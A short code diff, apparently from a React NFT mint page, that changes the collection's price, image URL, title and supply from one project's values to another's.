@@ -3,10 +3,10 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = 0.02
-const image = 'https://images-ext-1.discordapp.net/external/U9klOTjsVhs51gU_5bxOI8nqdMzsJSM1AYflhdK1JC8/https/pbs.twimg.com/profile_images/1513067488795406337/3dcIX2ZW_400x400.jpg'
-const Title = 'Lonely Stoner'
-const supply = 10420
+const ethAmount = 0.06
+const image = 'https://media.discordapp.net/attachments/950881243615068202/961690473431453716/IMG_0481.jpg?width=590&height=590'
+const Title = 'Trippy Frens'
+const supply = 8888
 
 document.title = Title
 
